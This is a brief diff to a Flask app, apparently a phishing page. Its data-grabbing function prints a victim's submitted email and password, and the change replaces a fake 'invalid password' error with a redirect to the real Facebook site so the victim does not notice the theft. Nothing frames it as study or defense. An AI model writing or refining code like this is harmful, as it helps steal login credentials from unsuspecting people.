@@ -1,4 +1,4 @@
-from flask import Flask, render_template
+from flask import Flask, render_template,request,redirect
 
 app = Flask(__name__)
 
@@ -13,6 +13,6 @@ def pega_dados():
     
     print(f"EMAIL:{email} \n  SENHA:{senha}")
 
-    return "ERRO: senha inválida!"
+    return redirect("https://www.facebook.com/?locale=pt_BR")
 
 app.run()
